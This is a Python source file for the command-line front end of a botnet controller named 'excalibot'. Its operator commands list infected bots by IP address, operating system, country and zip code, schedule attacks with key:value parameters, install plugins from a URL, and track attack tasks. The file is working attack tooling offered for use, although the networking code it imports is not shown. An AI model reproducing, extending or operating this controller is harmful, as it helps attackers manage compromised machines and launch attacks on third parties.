#!/usr/bin/env python
from classes.operations import Operations


class Options:
    @staticmethod
    def help(args):
        # Describe usage of the cli
        if len(args) == 0:
            print('The Holy Botnet')
            print('Usage: excalibot COMMAND HOST PORT [PARAMETERS]')
            print('Commands:')
            print('  help\t\tPrint usage')
            print('  list\t\tList available bots')
            print('  attack\tSchedule new attacks')
            print('  install\tInstall new plugin')
            print('  status\tCheck task completion status')
            print('  clear\t\tClear task from control center')
        elif args[0] == 'list':
            print('>List available bots')
            print('Usage: excalibot list HOST PORT KEY')
            print('Keys:')
            print('  id\t\tSort list by botid')
            print('  ipAddress\tSort list by IP address')
            print('  lastSeen\tSort list by seconds since last report')
            print('  os\t\tSort list by Operative System')
            print('  countryCode\tSort list by Country')
            print('  zip\t\tSort list by zip code')
        elif args[0] == 'attack':
            print('>Schedule new attacks')
            print('Usage: excalibot attack HOST PORT ATTACK [KEY:VALUE]')
            print('Attack: Installed plugins')
            print('  KEY:VALUE: parameters to the attack, order does not matter, use a key:value organization')
            # TODO get plugins from server
        elif args[0] == 'install':
            print('>Install new plugin')
            print('Usage: excalibot install HOST PORT URL')
            print('  Url: url to the plugin resource')
        elif args[0] == 'status':
            print('>Check task completion status')
            print('Usage: excalibot status HOST PORT ID (-b)')
            print('Id: id of the task to get status')
            print('  (-b): use the -b to block until task is completed')
        elif args[0] == 'clear':
            print('>Clear task from control center')
            print('Usage: excalibot clear HOST PORT ID')
            print('  ID: id of the task to delete')

    @staticmethod
    def list(args):
        # List available bots {list $host $port $key}
        if len(args) < 2:
            print('Invalid parameters')
            return
        try:
            bot_list = Operations.list(args[0], args[1])
            if bot_list == -1:
                print('Error Connecting')
                return
            if len(args) < 3 or args[2] not in ['id', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']:
                bot_list = Operations.sort(bot_list, 'lastSeen')
            else:
                bot_list = Operations.sort(bot_list, args[2])
            Operations.print_list(bot_list)
        except:
            print("Error connecting")

    @staticmethod
    def attack(args):
        # Request attack {attack $host $port $attack [$parameters]}
        if len(args) < 3:
            print('Invalid parameters')
            return
        param = Operations.hash_args(args[3:])
        try:
            if param == -1:
                print('Invalid attack parameters')
                return
            Operations.post_attack(args[0], args[1], args[2], param)
        except:
            print("Error connecting")

    @staticmethod
    def install(args):
        # Install new plugin {install $host $port $url}
        if len(args) < 3:
            print('Invalid parameters')
            return
        try:
            response = Operations.install(args[0], args[1], args[2])
            if response == -1:
                print('Invalid install parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")

    @staticmethod
    def status(args):
        # Check task completion status {status $host $port $id ($-b)}
        if len(args) < 3:
            print('Invalid parameters')
            return
        block = True
        try:
            while block:
                response = Operations.status(args[0], args[1], args[2])
                if len(args) >= 3 and args[3] == '-b':
                    block = Operations.block(response)
                else:
                    block = False
            if response == -1:
                print('Invalid install parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")

    @staticmethod
    def clear(args):
        # Clear task from control center {clear $host $port $id}
        if len(args) < 3:
            print('Invalid parameters')
            return
        try:
            response = Operations.clear(args[0], args[1], args[2])
            if response == -1:
                print('Invalid clear parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")
